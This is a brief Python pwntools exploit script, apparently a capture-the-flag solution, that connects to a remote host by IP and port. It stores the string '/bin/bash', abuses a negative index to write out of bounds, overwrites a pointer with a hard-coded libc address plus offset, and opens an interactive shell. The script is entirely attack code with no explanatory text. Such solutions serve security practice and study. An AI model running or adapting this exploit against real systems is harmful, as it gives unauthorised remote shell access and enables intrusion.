
from pwn import *

io = remote("109.233.56.90", 11671)

io.recvuntil(b"Get word")

win_libc = 0x7ffff7de3000
offset = 0x48f20

io.send('1\n')
io.sendafter(b"Enter index: ", "1\n")
io.sendafter(b"Enter word: ", b"/bin/bash\0")


io.recvuntil(b"Get word")
io.send('1\n')
io.sendafter(b"Enter index: ", "-17\n")
io.sendafter(b"Enter word: ", p64(win_libc+offset))


io.interactive()
